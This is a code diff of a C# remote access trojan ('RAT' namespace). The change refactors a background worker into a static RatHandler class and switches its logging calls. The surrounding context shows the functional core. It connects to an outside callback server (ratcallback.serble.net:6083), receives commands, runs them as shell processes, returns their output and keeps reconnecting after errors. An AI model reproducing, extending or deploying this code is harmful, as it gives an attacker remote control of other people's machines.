@@ -1,17 +1,12 @@
-using System.Net.Sockets;
 using System.Diagnostics;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
+using GeneralPurposeLib;
 
-namespace RAT;
+namespace RAT; 
 
-public class Worker : BackgroundService {
-    private readonly ILogger<Worker> _logger;
-
-    public Worker(ILogger<Worker> logger) {
-        _logger = logger;
-    }
-    
+public class RatHandler {
     private static string ReceiveMessage(Stream stream) {
         // Read until we get a newline
         StringBuilder cmdBuilder = new();
@@ -36,38 +31,38 @@ public class Worker : BackgroundService {
         socket.Write(Encoding.UTF8.GetBytes(data + "\n"));
     }
 
-    protected override Task ExecuteAsync(CancellationToken stoppingToken) {
+    public static Task ExecuteAsync(CancellationToken stoppingToken) {
         while (!stoppingToken.IsCancellationRequested) {
             try {
                 ExecuteRat(stoppingToken).Wait(stoppingToken);
             }
             catch (OperationCanceledException) {
-                _logger.LogInformation("Exiting...");
+                Logger.Info("Exiting...");
                 break;
             }
             catch (Exception e) {
-                _logger.LogCritical(e.ToString());
-                _logger.LogInformation("Reconnecting in 5 seconds");
+                Logger.Error(e.ToString());
+                Logger.Info("Reconnecting in 5 seconds");
                 Thread.Sleep(5000);
-                _logger.LogInformation("Reconnecting...");
+                Logger.Info("Reconnecting...");
             }
         }
 
         return Task.CompletedTask;
     }
 
-    private async Task ExecuteRat(CancellationToken stoppingToken) {
-        _logger.LogInformation("RAT worker started");
+    private static async Task ExecuteRat(CancellationToken stoppingToken) {
+        Logger.Info("RAT worker started");
 
         TcpClient client = new();
         await client.ConnectAsync("ratcallback.serble.net", 6083, stoppingToken);
-        _logger.LogInformation("Connected to RAT server");
+        Logger.Info("Connected to RAT server");
 
         while (!stoppingToken.IsCancellationRequested) {
             NetworkStream stream = client.GetStream();
             
             string message = ReceiveMessage(stream);
-            _logger.LogInformation(message);
+            Logger.Info(message);
             
             // Process command
             string[] args = message.Split(' ');
@@ -111,7 +106,7 @@ public class Worker : BackgroundService {
                             UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                         })!;
 
-                        _logger.LogInformation("Running command: " + command);
+                        Logger.Info("Running command: " + command);
                         // Get process output
                         await process.WaitForExitAsync(stoppingToken);
                         string output = await process.StandardOutput.ReadToEndAsync();
@@ -119,10 +114,10 @@ public class Worker : BackgroundService {
                         output = output == "" ? error == "" ? "No output" : error : output;
                         // Send output message
                         outData = output;
-                        _logger.LogInformation("Command output: " + output);
+                        Logger.Info("Command output: " + output);
                     }
                     catch (Exception e) {
-                        _logger.LogError(e, "Error running command");
+                        Logger.Error(e);
                         // Send error message
                         await stream.WriteAsync(Encoding.UTF8.GetBytes("Error: " + e.Message), stoppingToken);
                     }
@@ -152,11 +147,11 @@ public class Worker : BackgroundService {
                             UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true
                         })!;
 
-                        _logger.LogInformation("Running command: " + commandBegin);
+                        Logger.Info("Running command: " + commandBegin);
                         outData = "Started execution";
                     }
                     catch (Exception e) {
-                        _logger.LogError(e, "Error running command");
+                        Logger.Error(e);
                         // Send error message
                         await stream.WriteAsync(Encoding.UTF8.GetBytes("Error: " + e.Message), stoppingToken);
                     }
@@ -268,12 +263,4 @@ public class Worker : BackgroundService {
         }
         return RuntimeInformation.IsOSPlatform(OSPlatform.OSX) ? OsPlatform.OSX : OsPlatform.Unknown;
     }
-}
-
-public enum OsPlatform {
-    Windows,
-    Linux,
-    // ReSharper disable once InconsistentNaming
-    OSX,
-    Unknown
 }
